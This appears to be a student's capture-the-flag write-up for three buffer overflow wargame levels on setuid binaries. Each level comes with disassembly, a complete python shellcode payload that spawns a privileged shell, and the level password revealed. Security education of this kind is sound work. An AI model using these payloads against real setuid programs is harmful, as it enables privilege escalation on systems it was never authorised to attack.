---
title: 1-0 Wargame Writeup [lv0~lv3]
tags: assignment1 wargame bof lob lv0 lv1 lv2
---

## 0. lv0 > lv1
```
-rwsr-sr-x 1 lv1 lv1 11987 Feb 25  2010 lv1
```
binary "lv1" allows the user to use the permission of user:lv1 upon execution. Let's disassemble this binary

```nasm
   0x08048439 <+9>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x0804843d <+13>:	jg     0x8048456 <main+38>
```
first, the program checks if argc is 1 and exits the program if true.
If not, program continues

```nasm
   0x08048456 <+38>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048459 <+41>:	add    eax,0x4
   0x0804845c <+44>:	mov    edx,DWORD PTR [eax]
   0x0804845e <+46>:	push   edx
   0x0804845f <+47>:	lea    eax,[ebp-0x100]
   0x08048465 <+53>:	push   eax
   0x08048466 <+54>:	call   0x8048370 <strcpy@plt>
   0x0804846b <+59>:	add    esp,0x8
   0x0804846e <+62>:	lea    eax,[ebp-0x100]
   0x08048474 <+68>:	push   eax
   0x08048475 <+69>:	push   0x80484ec
   0x0804847a <+74>:	call   0x8048350 <printf@plt>  
```
the program then copies data from eax to ebp-0x100 using strcpy and prints the copied data using printf

ebp+0xc contains address for array of pointers that point to argv's. adding 4 to ebp+0xc gives address for argv[1], which contains the value that's being copied to ebp-0x100.

Since the program does not limit buffer size, it's vulnerable to BOF attacks. I used "Return To Shellcode" method to solve this problem.

the payload should look like this:
1. nop
2. shellcode 
3. dummy data
4. approximate address of shellcode

following is the payload (260 bytes):
```bash
`python -c 'print "\x90"*165 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "A"*54 +  "\x38\xd0\xff\xff"'`
```
we can get the shell that has the uid of lv1

```bash
$ my-pass
hello newbie!
```
<br>

## 1. lv1 > lv2
```bash
-rwsr-sr-x 1 lv2  lv2  11970 Feb 25  2010 lv2
```
binary "lv2" has the same special permission as the previous "lv1". Let's take a deeper look.
```nasm
   0x08048453 <+35>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048456 <+38>:	add    eax,0x4
   0x08048459 <+41>:	mov    edx,DWORD PTR [eax]
   0x0804845b <+43>:	push   edx
   0x0804845c <+44>:	lea    eax,[ebp-0x10]
   0x0804845f <+47>:	push   eax
   0x08048460 <+48>:	call   0x8048370 <strcpy@plt>
```
lv2 is similar to previous lv1 but the copy destination is different. Its size is 0x10 which is too small to fit the shellcode (41 bytes).
So, lets use the shellcode stored in argv instead of the buffer.

Our payload should look like this:
1. dummy data
2. return address
3. nop
4. shellcode

following is the payload i used:
```bash
`python -c 'print "\x90"*20+"\x30\xd4\xff\xff"+"\x90"*30+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

we got the shell!
```bash
$ my-pass
tooo easy
```
<br>

## 2. lv2 > lv3
```bash
-rwsr-sr-x 1 lv3  lv3   11824 Feb 25  2010 lv3
```
Same permissions. Lets take a look.
```nasm
   0x080483fe <+6>:	lea    eax,[ebp-0x10]
   0x08048401 <+9>:	push   eax
   0x08048402 <+10>:	call   0x804830c <gets@plt>
```
this program uses gets to store input from stdin to buffer.

payload structure:
1. dummy data
2. return address
3. nop
4. shellcode

payload used:
```bash
(python -c'print "A"*20+"\x30\xd2\xff\xff"+"\x90"*20+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"';cat)
```

we can get the shell by passing this to lv3 via pipe
```bash
my-pass
i dont like stdin
```

<br>
